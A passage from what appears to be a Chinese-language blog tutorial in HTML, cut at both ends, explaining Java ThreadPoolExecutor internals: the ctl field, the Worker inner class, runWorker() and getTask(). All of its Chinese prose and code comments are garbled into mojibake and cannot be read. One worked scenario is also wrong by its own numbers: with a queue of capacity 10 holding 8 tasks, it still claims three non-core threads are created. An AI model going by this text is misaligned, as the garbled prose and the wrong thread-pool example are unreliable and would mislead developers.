<li>çŠ¶æ€å’Œæ•°é‡çš„æ›´æ–°æ˜¯åŸå­æ“ä½œ</li>
</ul>
<p><strong>é€šä¿—ç†è§£ï¼š</strong></p>
<ul>
<li><code>ctl</code>å°±åƒä¸€ä¸ª"çŠ¶æ€è®¡æ•°å™¨"ï¼Œç”¨ä¸€ä¸ªæ•°å­—åŒæ—¶è®°å½•"çº¿ç¨‹æ± æ˜¯ä»€ä¹ˆçŠ¶æ€"å’Œ"æœ‰å¤šå°‘ä¸ªçº¿ç¨‹"</li>
<li>é«˜3ä½å­˜çŠ¶æ€ï¼ˆRUNNINGã€SHUTDOWNç­‰ï¼‰ï¼Œä½29ä½å­˜çº¿ç¨‹æ•°é‡</li>
</ul>
<h5 data-id="heading-26">1.8.2 Workerç±»</h5>
<p><code>Worker</code>æ˜¯<code>ThreadPoolExecutor</code>çš„<strong>å†…éƒ¨ç±»</strong>ï¼Œç”¨äºå°è£…å·¥ä½œçº¿ç¨‹ã€‚æ¯ä¸ªå·¥ä½œçº¿ç¨‹éƒ½å¯¹åº”ä¸€ä¸ª<code>Worker</code>å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è¿™æ˜¯ThreadPoolExecutorçš„å†…éƒ¨ç±»ï¼ˆprivate final classï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> {
    <span class="hljs-keyword">final</span> Thread thread;        <span class="hljs-comment">// å·¥ä½œçº¿ç¨‹ï¼ˆçœŸæ­£çš„çº¿ç¨‹å¯¹è±¡ï¼‰</span>
    Runnable firstTask;         <span class="hljs-comment">// ç¬¬ä¸€ä¸ªä»»åŠ¡ï¼ˆåˆ›å»ºWorkeræ—¶ä¼ å…¥çš„ä»»åŠ¡ï¼‰</span>
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">long</span> completedTasks; <span class="hljs-comment">// å®Œæˆçš„ä»»åŠ¡æ•°</span>
    
    Worker(Runnable firstTask) {
        setState(-<span class="hljs-number">1</span>); <span class="hljs-comment">// ç¦æ­¢ä¸­æ–­ï¼Œç›´åˆ°runWorker</span>
        <span class="hljs-built_in">this</span>.firstTask = firstTask;
        <span class="hljs-comment">// åˆ›å»ºçœŸæ­£çš„çº¿ç¨‹ï¼Œè¿™ä¸ªçº¿ç¨‹æ‰§è¡Œçš„å°±æ˜¯Workerçš„run()æ–¹æ³•</span>
        <span class="hljs-built_in">this</span>.thread = getThreadFactory().newThread(<span class="hljs-built_in">this</span>);
    }
    
    <span class="hljs-comment">// Workerå®ç°äº†Runnableæ¥å£ï¼Œæ‰€ä»¥Workeræœ¬èº«å°±æ˜¯ä¸€ä¸ªä»»åŠ¡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è°ƒç”¨ThreadPoolExecutorçš„runWorkeræ–¹æ³•</span>
        runWorker(<span class="hljs-built_in">this</span>);
    }
    
    <span class="hljs-comment">// ä½¿ç”¨AQSå®ç°é”ï¼Œç”¨äºæ§åˆ¶çº¿ç¨‹çš„ä¸­æ–­</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHeldExclusively</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> getExclusiveOwnerThread() == Thread.currentThread();
    }
}
</code></pre>
<p><strong>Workerçš„ä½œç”¨ï¼ˆé€šä¿—ç†è§£ï¼‰ï¼š</strong></p>
<ul>
<li><code>Worker</code>å°±åƒä¸€ä¸ª"å·¥äºº"çš„æ¡£æ¡ˆï¼Œè®°å½•äº†è¿™ä¸ªå·¥äººï¼ˆçº¿ç¨‹ï¼‰çš„ä¿¡æ¯</li>
<li>æ¯ä¸ª<code>Worker</code>åŒ…å«ä¸€ä¸ªçœŸæ­£çš„<code>Thread</code>å¯¹è±¡ï¼ˆçœŸæ­£çš„çº¿ç¨‹ï¼‰</li>
<li><code>Worker</code>è¿˜è®°å½•äº†åˆ†é…ç»™å®ƒçš„ç¬¬ä¸€ä¸ªä»»åŠ¡ï¼Œä»¥åŠå®Œæˆäº†å¤šå°‘ä¸ªä»»åŠ¡</li>
<li>å½“çº¿ç¨‹æ± åˆ›å»ºæ–°çº¿ç¨‹æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ª<code>Worker</code>å¯¹è±¡ï¼Œç„¶åå¯åŠ¨<code>Worker</code>ä¸­çš„çº¿ç¨‹</li>
</ul>
<p><strong>å·¥ä½œæµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-number">1</span>. çº¿ç¨‹æ± éœ€è¦åˆ›å»ºæ–°çº¿ç¨‹æ—¶
   â†“
<span class="hljs-number">2</span>. åˆ›å»ºä¸€ä¸ªWorkerå¯¹è±¡ï¼ˆåŒ…å«Threadå’ŒfirstTaskï¼‰
   â†“
<span class="hljs-number">3</span>. å¯åŠ¨Workerä¸­çš„Thread
   â†“
<span class="hljs-number">4</span>. Threadæ‰§è¡ŒWorkerçš„<span class="hljs-built_in">run</span>()æ–¹æ³•
   â†“
<span class="hljs-number">5</span>. <span class="hljs-built_in">run</span>()æ–¹æ³•è°ƒç”¨ThreadPoolExecutorçš„<span class="hljs-built_in">runWorker</span>()æ–¹æ³•
   â†“
<span class="hljs-number">6</span>. <span class="hljs-built_in">runWorker</span>()æ–¹æ³•å¼€å§‹æ‰§è¡Œä»»åŠ¡
</code></pre>
<p><strong>ç¤ºä¾‹è¯´æ˜ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å½“æˆ‘ä»¬åˆ›å»ºçº¿ç¨‹æ± æ—¶</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>, ...);

<span class="hljs-comment">// å½“æˆ‘ä»¬æäº¤ä»»åŠ¡æ—¶</span>
executor.execute(() -&gt; System.out.println(<span class="hljs-string">"ä»»åŠ¡"</span>));

<span class="hljs-comment">// çº¿ç¨‹æ± å†…éƒ¨ä¼šï¼š</span>
<span class="hljs-comment">// 1. åˆ›å»ºä¸€ä¸ªWorkerå¯¹è±¡</span>
<span class="hljs-type">Worker</span> <span class="hljs-variable">worker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(task);  <span class="hljs-comment">// taskæ˜¯æˆ‘ä»¬è¦æ‰§è¡Œçš„ä»»åŠ¡</span>

<span class="hljs-comment">// 2. Workerå†…éƒ¨åˆ›å»ºThread</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(worker);  <span class="hljs-comment">// workerå®ç°äº†Runnable</span>

<span class="hljs-comment">// 3. å¯åŠ¨çº¿ç¨‹</span>
thread.start();  <span class="hljs-comment">// è¿™æ—¶ä¼šæ‰§è¡Œworker.run()</span>

<span class="hljs-comment">// 4. worker.run()è°ƒç”¨runWorker(worker)</span>
runWorker(worker);  <span class="hljs-comment">// å¼€å§‹æ‰§è¡Œä»»åŠ¡</span>
</code></pre>
<h5 data-id="heading-27">1.8.3 runWorker()æ–¹æ³•</h5>
<p><code>runWorker()</code>æ˜¯<code>ThreadPoolExecutor</code>çš„<strong>ç§æœ‰æ–¹æ³•</strong>ï¼Œæ˜¯å·¥ä½œçº¿ç¨‹æ‰§è¡Œä»»åŠ¡çš„æ ¸å¿ƒé€»è¾‘ã€‚è¿™ä¸ªæ–¹æ³•ä¼šè¢«<code>Worker.run()</code>è°ƒç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è¿™æ˜¯ThreadPoolExecutorçš„ç§æœ‰æ–¹æ³•</span>
<span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runWorker</span><span class="hljs-params">(Worker w)</span> {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">wt</span> <span class="hljs-operator">=</span> Thread.currentThread();  <span class="hljs-comment">// å½“å‰å·¥ä½œçº¿ç¨‹</span>
    <span class="hljs-type">Runnable</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> w.firstTask;         <span class="hljs-comment">// è·å–Workerçš„ç¬¬ä¸€ä¸ªä»»åŠ¡</span>
    w.firstTask = <span class="hljs-literal">null</span>;                  <span class="hljs-comment">// æ¸…ç©ºï¼Œå› ä¸ºè¦æ‰§è¡Œäº†</span>
    w.unlock();                          <span class="hljs-comment">// å…è®¸ä¸­æ–­</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">completedAbruptly</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// æ ¸å¿ƒå¾ªç¯ï¼šä¸æ–­è·å–ä»»åŠ¡å¹¶æ‰§è¡Œ</span>
        <span class="hljs-comment">// æ¡ä»¶ï¼štaskä¸ä¸ºnullï¼ˆç¬¬ä¸€ä¸ªä»»åŠ¡ï¼‰æˆ–è€…èƒ½ä»é˜Ÿåˆ—ä¸­è·å–åˆ°ä»»åŠ¡</span>
        <span class="hljs-keyword">while</span> (task != <span class="hljs-literal">null</span> || (task = getTask()) != <span class="hljs-literal">null</span>) {
            w.lock();  <span class="hljs-comment">// åŠ é”ï¼Œé˜²æ­¢è¢«ä¸­æ–­</span>
            
            <span class="hljs-comment">// æ£€æŸ¥çº¿ç¨‹æ± çŠ¶æ€ï¼Œå¦‚æœå·²åœæ­¢ï¼Œä¸­æ–­å½“å‰çº¿ç¨‹</span>
            <span class="hljs-keyword">if</span> ((runStateAtLeast(ctl.get(), STOP) ||
                 (Thread.interrupted() &amp;&amp; runStateAtLeast(ctl.get(), STOP))) &amp;&amp;
                !wt.isInterrupted())
                wt.interrupt();
            
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// æ‰§è¡Œå‰é’©å­ï¼ˆå¯ä»¥é‡å†™ï¼Œç”¨äºç›‘æ§ã€æ—¥å¿—ç­‰ï¼‰</span>
                beforeExecute(wt, task);
                
                <span class="hljs-type">Throwable</span> <span class="hljs-variable">thrown</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// çœŸæ­£æ‰§è¡Œä»»åŠ¡ï¼è¿™é‡Œè°ƒç”¨çš„æ˜¯æˆ‘ä»¬æäº¤çš„Runnableçš„run()æ–¹æ³•</span>
                    task.run();
                } <span class="hljs-keyword">catch</span> (RuntimeException x) {
                    thrown = x; <span class="hljs-keyword">throw</span> x;
                } <span class="hljs-keyword">catch</span> (Error x) {
                    thrown = x; <span class="hljs-keyword">throw</span> x;
                } <span class="hljs-keyword">catch</span> (Throwable x) {
                    thrown = x; <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(x);
                } <span class="hljs-keyword">finally</span> {
                    <span class="hljs-comment">// æ‰§è¡Œåé’©å­ï¼ˆå¯ä»¥é‡å†™ï¼Œç”¨äºç›‘æ§ã€æ—¥å¿—ç­‰ï¼‰</span>
                    afterExecute(task, thrown);
                }
            } <span class="hljs-keyword">finally</span> {
                task = <span class="hljs-literal">null</span>;              <span class="hljs-comment">// æ¸…ç©ºä»»åŠ¡å¼•ç”¨</span>
                w.completedTasks++;       <span class="hljs-comment">// å®Œæˆä»»åŠ¡æ•°+1</span>
                w.unlock();               <span class="hljs-comment">// è§£é”</span>
            }
        }
        completedAbruptly = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æ­£å¸¸é€€å‡º</span>
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-comment">// å¤„ç†å·¥ä½œçº¿ç¨‹é€€å‡ºï¼ˆä»workersé›†åˆä¸­ç§»é™¤ï¼Œå¯èƒ½åˆ›å»ºæ–°çº¿ç¨‹ç­‰ï¼‰</span>
        processWorkerExit(w, completedAbruptly);
    }
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹ï¼ˆé€šä¿—ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-number">1</span>. Workerçš„çº¿ç¨‹å¯åŠ¨åï¼Œè°ƒç”¨<span class="hljs-built_in">runWorker</span>(worker)
   â†“
<span class="hljs-number">2</span>. å…ˆæ‰§è¡ŒWorkerçš„ç¬¬ä¸€ä¸ªä»»åŠ¡ï¼ˆå¦‚æœæœ‰ï¼‰
   â†“
<span class="hljs-number">3</span>. è¿›å…¥å¾ªç¯ï¼š
   - è°ƒç”¨<span class="hljs-built_in">getTask</span>()ä»é˜Ÿåˆ—ä¸­è·å–ä»»åŠ¡
   - å¦‚æœè·å–åˆ°ä»»åŠ¡ï¼Œå°±æ‰§è¡Œtask<span class="hljs-selector-class">.run</span>()
   - æ‰§è¡Œå®Œåç»§ç»­å¾ªç¯ï¼Œè·å–ä¸‹ä¸€ä¸ªä»»åŠ¡
   â†“
<span class="hljs-number">4</span>. å¦‚æœ<span class="hljs-built_in">getTask</span>()è¿”å›nullï¼ˆé˜Ÿåˆ—ç©ºäº†æˆ–çº¿ç¨‹æ± å…³é—­ï¼‰ï¼Œé€€å‡ºå¾ªç¯
   â†“
<span class="hljs-number">5</span>. è°ƒç”¨<span class="hljs-built_in">processWorkerExit</span>()å¤„ç†çº¿ç¨‹é€€å‡º
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li><code>runWorker()</code>æ˜¯å·¥ä½œçº¿ç¨‹çš„"ä¸»å¾ªç¯"ï¼Œä¸æ–­ä»é˜Ÿåˆ—ä¸­å–ä»»åŠ¡å¹¶æ‰§è¡Œ</li>
<li><code>task.run()</code>è¿™é‡Œæ‰æ˜¯çœŸæ­£æ‰§è¡Œæˆ‘ä»¬æäº¤çš„ä»»åŠ¡</li>
<li>ä¸€ä¸ªçº¿ç¨‹å¯ä»¥æ‰§è¡Œå¤šä¸ªä»»åŠ¡ï¼ˆè¿™å°±æ˜¯çº¿ç¨‹å¤ç”¨çš„åŸç†ï¼‰</li>
</ul>
<p><strong>ç¤ºä¾‹è¯´æ˜ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æˆ‘ä»¬æäº¤3ä¸ªä»»åŠ¡</span>
executor.execute(() -&gt; System.out.println(<span class="hljs-string">"ä»»åŠ¡1"</span>));
executor.execute(() -&gt; System.out.println(<span class="hljs-string">"ä»»åŠ¡2"</span>));
executor.execute(() -&gt; System.out.println(<span class="hljs-string">"ä»»åŠ¡3"</span>));

<span class="hljs-comment">// çº¿ç¨‹æ± å†…éƒ¨æ‰§è¡Œæµç¨‹ï¼š</span>
<span class="hljs-comment">// 1. åˆ›å»ºWorkerï¼Œå¯åŠ¨çº¿ç¨‹</span>
<span class="hljs-comment">// 2. çº¿ç¨‹æ‰§è¡ŒrunWorker(worker)</span>
<span class="hljs-comment">// 3. runWorkerä¸­ï¼š</span>
<span class="hljs-comment">//    - ç¬¬ä¸€æ¬¡å¾ªç¯ï¼šgetTask()è¿”å›"ä»»åŠ¡1"ï¼Œæ‰§è¡Œtask.run() â†’ æ‰“å°"ä»»åŠ¡1"</span>
<span class="hljs-comment">//    - ç¬¬äºŒæ¬¡å¾ªç¯ï¼šgetTask()è¿”å›"ä»»åŠ¡2"ï¼Œæ‰§è¡Œtask.run() â†’ æ‰“å°"ä»»åŠ¡2"</span>
<span class="hljs-comment">//    - ç¬¬ä¸‰æ¬¡å¾ªç¯ï¼šgetTask()è¿”å›"ä»»åŠ¡3"ï¼Œæ‰§è¡Œtask.run() â†’ æ‰“å°"ä»»åŠ¡3"</span>
<span class="hljs-comment">//    - ç¬¬å››æ¬¡å¾ªç¯ï¼šgetTask()è¿”å›nullï¼ˆé˜Ÿåˆ—ç©ºäº†ï¼‰ï¼Œé€€å‡ºå¾ªç¯</span>
<span class="hljs-comment">// 4. ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œäº†3ä¸ªä»»åŠ¡ï¼Œè¿™å°±æ˜¯çº¿ç¨‹å¤ç”¨ï¼</span>
</code></pre>
<h5 data-id="heading-28">1.8.4 getTask()æ–¹æ³•</h5>
<p><code>getTask()</code>æ˜¯<code>ThreadPoolExecutor</code>çš„<strong>ç§æœ‰æ–¹æ³•</strong>ï¼Œç”¨äºä»å·¥ä½œé˜Ÿåˆ—ä¸­è·å–ä»»åŠ¡ã€‚è¿™ä¸ªæ–¹æ³•ä¼šè¢«<code>runWorker()</code>è°ƒç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è¿™æ˜¯ThreadPoolExecutorçš„ç§æœ‰æ–¹æ³•</span>
<span class="hljs-keyword">private</span> Runnable <span class="hljs-title function_">getTask</span><span class="hljs-params">()</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">timedOut</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æ˜¯å¦è¶…æ—¶</span>
    
    <span class="hljs-keyword">for</span> (;;) {  <span class="hljs-comment">// æ— é™å¾ªç¯ï¼Œç›´åˆ°è·å–åˆ°ä»»åŠ¡æˆ–è¿”å›null</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ctl.get();
        <span class="hljs-type">int</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> runStateOf(c);  <span class="hljs-comment">// è·å–çº¿ç¨‹æ± çŠ¶æ€</span>
        
        <span class="hljs-comment">// æ£€æŸ¥çº¿ç¨‹æ± çŠ¶æ€ï¼šå¦‚æœå·²å…³é—­ä¸”ï¼ˆå·²åœæ­¢æˆ–é˜Ÿåˆ—ä¸ºç©ºï¼‰ï¼Œè¿”å›null</span>
        <span class="hljs-keyword">if</span> (rs &gt;= SHUTDOWN &amp;&amp; (rs &gt;= STOP || workQueue.isEmpty())) {
            decrementWorkerCount();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <span class="hljs-comment">// è¿”å›nullï¼ŒrunWorkerä¼šé€€å‡ºå¾ªç¯</span>
        }
        
        <span class="hljs-type">int</span> <span class="hljs-variable">wc</span> <span class="hljs-operator">=</span> workerCountOf(c);  <span class="hljs-comment">// è·å–å½“å‰çº¿ç¨‹æ•°</span>
        
        <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦å…è®¸è¶…æ—¶ï¼š</span>
        <span class="hljs-comment">// - å¦‚æœå…è®¸æ ¸å¿ƒçº¿ç¨‹è¶…æ—¶ï¼Œæˆ–è€…å½“å‰çº¿ç¨‹æ•°è¶…è¿‡æ ¸å¿ƒçº¿ç¨‹æ•°ï¼Œåˆ™å…è®¸è¶…æ—¶</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">timed</span> <span class="hljs-operator">=</span> allowCoreThreadTimeOut || wc &gt; corePoolSize;
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦éœ€è¦å›æ”¶çº¿ç¨‹ï¼ˆçº¿ç¨‹æ•°è¿‡å¤šæˆ–è¶…æ—¶ï¼‰</span>
        <span class="hljs-keyword">if</span> ((wc &gt; maximumPoolSize || (timed &amp;&amp; timedOut))
            &amp;&amp; (wc &gt; <span class="hljs-number">1</span> || workQueue.isEmpty())) {
            <span class="hljs-keyword">if</span> (compareAndDecrementWorkerCount(c))
                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;  <span class="hljs-comment">// è¿”å›nullï¼Œçº¿ç¨‹ä¼šè¢«å›æ”¶</span>
            <span class="hljs-keyword">continue</span>;
        }
        
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä»é˜Ÿåˆ—ä¸­è·å–ä»»åŠ¡</span>
            <span class="hljs-type">Runnable</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> timed ?
                <span class="hljs-comment">// å…è®¸è¶…æ—¶ï¼šä½¿ç”¨poll()ï¼Œç­‰å¾…keepAliveTimeæ—¶é—´</span>
                workQueue.poll(keepAliveTime, TimeUnit.NANOSECONDS) :
                <span class="hljs-comment">// ä¸å…è®¸è¶…æ—¶ï¼šä½¿ç”¨take()ï¼Œä¸€ç›´é˜»å¡ç­‰å¾…</span>
                workQueue.take();
            
            <span class="hljs-keyword">if</span> (r != <span class="hljs-literal">null</span>)
                <span class="hljs-keyword">return</span> r;  <span class="hljs-comment">// è·å–åˆ°ä»»åŠ¡ï¼Œè¿”å›</span>
            timedOut = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// è¶…æ—¶äº†ï¼Œæ ‡è®°ä¸€ä¸‹</span>
        } <span class="hljs-keyword">catch</span> (InterruptedException retry) {
            timedOut = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¢«ä¸­æ–­ï¼Œé‡è¯•</span>
        }
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼ˆé€šä¿—ç†è§£ï¼‰ï¼š</strong></p>
<ol>
<li>
<p><strong>æ ¸å¿ƒçº¿ç¨‹ vs éæ ¸å¿ƒçº¿ç¨‹çš„è·å–æ–¹å¼ï¼š</strong></p>
<ul>
<li><strong>æ ¸å¿ƒçº¿ç¨‹</strong>ï¼šä½¿ç”¨<code>workQueue.take()</code>ï¼Œä¼šä¸€ç›´é˜»å¡ç­‰å¾…ï¼Œç›´åˆ°æœ‰ä»»åŠ¡</li>
<li><strong>éæ ¸å¿ƒçº¿ç¨‹</strong>ï¼šä½¿ç”¨<code>workQueue.poll(keepAliveTime)</code>ï¼Œç­‰å¾…<code>keepAliveTime</code>æ—¶é—´ï¼Œå¦‚æœè¿˜æ²¡ä»»åŠ¡å°±è¿”å›null</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹å›æ”¶æœºåˆ¶ï¼š</strong></p>
<ul>
<li>éæ ¸å¿ƒçº¿ç¨‹å¦‚æœè¶…æ—¶ï¼ˆ<code>keepAliveTime</code>æ—¶é—´å†…æ²¡è·å–åˆ°ä»»åŠ¡ï¼‰ï¼Œè¿”å›null</li>
<li>è¿”å›nullåï¼Œ<code>runWorker()</code>é€€å‡ºå¾ªç¯ï¼Œçº¿ç¨‹è¢«å›æ”¶</li>
<li>æ ¸å¿ƒçº¿ç¨‹é»˜è®¤ä¸ä¼šè¶…æ—¶ï¼Œä¼šä¸€ç›´ç­‰å¾…ä»»åŠ¡</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹æ± å…³é—­æ—¶çš„å¤„ç†ï¼š</strong></p>
<ul>
<li>å¦‚æœçº¿ç¨‹æ± å·²å…³é—­ï¼Œ<code>getTask()</code>è¿”å›null</li>
<li>æ‰€æœ‰å·¥ä½œçº¿ç¨‹çš„<code>runWorker()</code>éƒ½ä¼šé€€å‡ºï¼Œçº¿ç¨‹ç»“æŸ</li>
</ul>
</li>
</ol>
<p><strong>ç¤ºä¾‹è¯´æ˜ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºçº¿ç¨‹æ± ï¼šæ ¸å¿ƒçº¿ç¨‹æ•°=2ï¼Œæœ€å¤§çº¿ç¨‹æ•°=5ï¼ŒkeepAliveTime=60ç§’</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">10</span>)
);

<span class="hljs-comment">// åœºæ™¯1ï¼šæäº¤2ä¸ªä»»åŠ¡ï¼ˆæ ¸å¿ƒçº¿ç¨‹æ‰§è¡Œï¼‰</span>
executor.execute(task1);
executor.execute(task2);
<span class="hljs-comment">// ä¸¤ä¸ªæ ¸å¿ƒçº¿ç¨‹åˆ†åˆ«æ‰§è¡Œä»»åŠ¡ï¼Œæ‰§è¡Œå®Œåï¼š</span>
<span class="hljs-comment">// - æ ¸å¿ƒçº¿ç¨‹è°ƒç”¨getTask()ï¼Œä½¿ç”¨take()æ–¹æ³•ï¼Œä¸€ç›´é˜»å¡ç­‰å¾…æ–°ä»»åŠ¡</span>

<span class="hljs-comment">// åœºæ™¯2ï¼šçªç„¶æ¥äº†10ä¸ªä»»åŠ¡</span>
<span class="hljs-comment">// - 2ä¸ªæ ¸å¿ƒçº¿ç¨‹æ‰§è¡Œ2ä¸ªä»»åŠ¡</span>
<span class="hljs-comment">// - é˜Ÿåˆ—ä¸­æ”¾å…¥8ä¸ªä»»åŠ¡</span>
<span class="hljs-comment">// - åˆ›å»º3ä¸ªéæ ¸å¿ƒçº¿ç¨‹æ‰§è¡Œå‰©ä½™ä»»åŠ¡</span>
<span class="hljs-comment">// æ‰§è¡Œå®Œåï¼š</span>
<span class="hljs-comment">// - æ ¸å¿ƒçº¿ç¨‹ï¼šgetTask()ä½¿ç”¨take()ï¼Œä¸€ç›´ç­‰å¾…</span>
<span class="hljs-comment">// - éæ ¸å¿ƒçº¿ç¨‹ï¼šgetTask()ä½¿ç”¨poll(60ç§’)ï¼Œ60ç§’å†…æ²¡ä»»åŠ¡å°±è¿”å›nullï¼Œçº¿ç¨‹è¢«å›æ”¶</span>

<span class="hljs-comment">// åœºæ™¯3ï¼šè°ƒç”¨shutdown()</span>
<span class="hljs-comment">// - æ‰€æœ‰çº¿ç¨‹çš„getTask()æ£€æŸ¥åˆ°çº¿ç¨‹æ± å·²å…³é—­ï¼Œè¿”å›null</span>
<span class="hljs-comment">// - æ‰€æœ‰çº¿ç¨‹çš„runWorker()é€€å‡ºå¾ªç¯ï¼Œçº¿ç¨‹ç»“æŸ</span>
</code></pre>
<p><strong>æ€»ç»“ï¼š</strong></p>
<ul>
<li><code>getTask()</code>æ˜¯å·¥ä½œçº¿ç¨‹ä»é˜Ÿåˆ—ä¸­"å–ä»»åŠ¡"çš„æ–¹æ³•</li>
<li>æ ¸å¿ƒçº¿ç¨‹ä¼šä¸€ç›´ç­‰å¾…ï¼ˆ<code>take()</code>ï¼‰ï¼Œéæ ¸å¿ƒçº¿ç¨‹ä¼šè¶…æ—¶ï¼ˆ<code>poll()</code>ï¼‰</li>
<li>è¿”å›nullè¡¨ç¤ºçº¿ç¨‹åº”è¯¥é€€å‡ºï¼Œçº¿ç¨‹ä¼šè¢«å›æ”¶</li>
</ul>
<h5 data-id="heading-29">1.8.5 Workerã€runWorker()ã€getTask()çš„å…³ç³»æ€»ç»“</h5>
<p><strong>å®ƒä»¬éƒ½æ˜¯ThreadPoolExecutorçš„å†…éƒ¨å®ç°ï¼Œå…³ç³»å¦‚ä¸‹ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">ThreadPoolExecutorï¼ˆçº¿ç¨‹æ± ï¼‰
  â”‚
  â”œâ”€ Workerï¼ˆå†…éƒ¨ç±»ï¼Œå°è£…å·¥ä½œçº¿ç¨‹ï¼‰
  â”‚   â”‚
  â”‚   â”œâ”€ Thread threadï¼ˆçœŸæ­£çš„çº¿ç¨‹å¯¹è±¡ï¼‰
  â”‚   â”œâ”€ Runnable firstTaskï¼ˆç¬¬ä¸€ä¸ªä»»åŠ¡ï¼‰
  â”‚   â””â”€ <span class="hljs-built_in">run</span>()æ–¹æ³• â†’ è°ƒç”¨<span class="hljs-built_in">runWorker</span>(this)
  â”‚
  â”œâ”€ <span class="hljs-built_in">runWorker</span>(Worker w)ï¼ˆç§æœ‰æ–¹æ³•ï¼Œå·¥ä½œçº¿ç¨‹çš„ä¸»å¾ªç¯ï¼‰
  â”‚   â”‚
  â”‚   â”œâ”€ æ‰§è¡ŒWorkerçš„ç¬¬ä¸€ä¸ªä»»åŠ¡
  â”‚   â”œâ”€ å¾ªç¯è°ƒç”¨<span class="hljs-built_in">getTask</span>()è·å–ä»»åŠ¡
  â”‚   â”œâ”€ æ‰§è¡Œä»»åŠ¡ï¼štask<span class="hljs-selector-class">.run</span>()
  â”‚   â””â”€ å¤„ç†çº¿ç¨‹é€€å‡º
  â”‚
  â””â”€ <span class="hljs-built_in">getTask</span>()ï¼ˆç§æœ‰æ–¹æ³•ï¼Œä»é˜Ÿåˆ—è·å–ä»»åŠ¡ï¼‰
      â”‚
      â”œâ”€ æ ¸å¿ƒçº¿ç¨‹ï¼šä½¿ç”¨<span class="hljs-built_in">take</span>()ï¼Œä¸€ç›´é˜»å¡ç­‰å¾…
      â””â”€ éæ ¸å¿ƒçº¿ç¨‹ï¼šä½¿ç”¨<span class="hljs-built_in">poll</span>()ï¼Œè¶…æ—¶è¿”å›null
</code></pre>
<p><strong>å®Œæ•´çš„å·¥ä½œæµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. æˆ‘ä»¬æäº¤ä»»åŠ¡</span>
executor.execute(() -&gt; System.out.println(<span class="hljs-string">"ä»»åŠ¡"</span>));

<span class="hljs-comment">// 2. çº¿ç¨‹æ± å†…éƒ¨åˆ›å»ºWorker</span>
<span class="hljs-type">Worker</span> <span class="hljs-variable">worker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(task);
